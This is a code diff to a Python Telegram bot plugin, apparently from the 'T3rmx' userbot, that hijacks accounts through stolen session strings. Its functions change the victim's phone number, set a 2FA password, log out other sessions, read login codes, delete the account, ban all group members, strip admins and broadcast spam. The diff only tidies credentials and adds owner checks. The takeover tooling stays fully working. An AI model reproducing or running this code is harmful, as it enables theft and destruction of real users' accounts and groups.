@@ -1,12 +1,13 @@
 
 from JoKeRUB import bot, l313l
+from ..core.session import tgbot
+from ..core.auth import is_owner
 from telethon import events, functions, types, Button
 from datetime import timedelta
 from JoKeRUB.utils import admin_cmd
 import asyncio
 from ..Config import Config
 import os, asyncio, re
-from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
@@ -17,12 +18,12 @@ from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
-bot = borg = tgbot
+# tgbot is the assistant bot client imported from core.session
 
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     bot = client = X
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
@@ -35,7 +36,7 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     bot = client = X
     result = await bot(functions.account.SendChangePhoneCodeRequest(
         phone_number=number,
@@ -49,12 +50,12 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     k = await X.get_me()
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     try:
         await X(rt())
         return True
@@ -63,12 +64,12 @@ async def terminate(strses):
 
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
@@ -76,16 +77,16 @@ async def promote(strses, grp, user):
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     try:
-      await X.edit_2fa('jepthon')
+      await X.edit_2fa('t3rmx')
       return True
     except:
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
@@ -96,32 +97,32 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     await X(join(username))
 
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     await X(dc(username))
     
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     i = ""
     
     async for x in X.iter_messages(777000, limit=3):
@@ -131,7 +132,7 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     k = await X.get_participants(grp)
     for x in k:
@@ -143,7 +144,7 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
     
     k = await X(pc())
     i = ""
@@ -193,6 +194,8 @@ mm = '''
 قم بلأنضمام الى قناة T3rmx @t3rmx_official
 '''
 
+_hack_owner_only = lambda e: is_owner(getattr(e, "sender_id", None))
+
 keyboard = [
   [  
     Button.inline("A", data="A"), 
@@ -226,7 +229,7 @@ if Config.TG_BOT_USERNAME is not None and tgbot is not None:
         joker = Bot_Username.replace("@", "")
         query = event.text
         await bot.get_me()
-        if query.startswith("هاك") and event.query.user_id == bot.uid:
+        if query.startswith("هاك") and is_owner(event.query.user_id):
             buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
             result = builder.article(
                 title="T3rmx 🤡",
@@ -248,7 +251,7 @@ async def repo(event):
 @tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
-  if event.sender_id == bot.uid:
+  if is_owner(event.sender_id):
       async with bot.conversation(event.chat_id) as x:
         keyboard = [
           [  
@@ -277,7 +280,7 @@ async def start(event):
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
     
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -296,11 +299,14 @@ async def users(event):
         file.write(i + "\n\nDetails BY @vvsks")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
-        system("rm -rf session.txt")
+        try:
+            os.remove("session.txt")
+        except OSError:
+            pass
       else:
         await event.reply(i + "\n\nشكراً لأستخدامك سورس T3rmx ❤️. \n/hack", buttons=keyboard)
       
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
     await x.send_message("الان ارسل الكود تيرمكس")
@@ -313,7 +319,7 @@ async def users(event):
     i = await userinfo(strses.text)
     await event.reply(i + "\n\nشكراً لأستخدامك سورس T3rmx ❤️.\n/hack", buttons=keyboard)
     
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
     await x.send_message("الان ارسل الكود تيرمكس")
@@ -328,7 +334,7 @@ async def users(event):
     await userbans(strses.text, grpid.text)
     await event.reply("يتم حظر جميع اعضاء القناة/الكروب", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -342,7 +348,7 @@ async def users(event):
       await event.reply(i + "\n\nشكرا لأستخدامك سورس T3rmx", buttons=keyboard)
     
       
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
     await x.send_message("الان ارسل الكود تيرمكس")
@@ -357,7 +363,7 @@ async def users(event):
     await joingroup(strses.text, grpid.text)
     await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
     await x.send_message("الان ارسل الكود تيرمكس")
@@ -372,7 +378,7 @@ async def users(event):
     await leavegroup(strses.text, grpid.text)
     await event.reply("لقد تم مغادرة القناة او الكروب,", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -387,7 +393,7 @@ async def users(event):
       await delgroup(strses.text, grpid.text)
       await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك T3rmx.", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("ارسل الكود تيرمكس")
@@ -403,7 +409,7 @@ async def users(event):
       else:
         await event.reply("للأسف الشخص مفعل التحقق بخطوتين", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -419,7 +425,7 @@ async def users(event):
       else:
           await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @vvsks\n{i}")
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -433,7 +439,7 @@ async def users(event):
       await event.reply("تم حذف الحساب بنجاح 😈.", buttons=keyboard)
 
       
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -450,7 +456,7 @@ async def users(event):
       i = await promote(strses.text, grp.text, user.text)
       await event.reply("سأرفعك في القناة/الكروب 😉.", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -468,7 +474,7 @@ async def users(event):
         pass
       await event.reply("تم حذف جميع مشرفين الكروب/القناة.", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -498,7 +504,7 @@ async def users(event):
 
 
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N"), func=_hack_owner_only))
 async def start(event):
     keyboard = [
       [  
@@ -515,7 +521,7 @@ async def start(event):
 
 
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -552,7 +558,7 @@ async def gcasta(strses, msg):
             print(e)        
 
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"a"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل لي الكود تيرمكس")
@@ -571,7 +577,7 @@ async def users(event):
 molb = True
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -676,7 +682,7 @@ async def gcastb(strses, msg):
             print(e)
 
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"b"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("ارسل الكود تيرمكس")
@@ -693,7 +699,7 @@ async def users(event):
       await event.reply(f"Done Gcasted In {i} Group 😉😉.", buttons=keyboard)
 
 async def gcastc(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -711,7 +717,7 @@ async def gcastc(strses, msg):
         except Exception as e:
             print(e)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"c"), func=_hack_owner_only))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
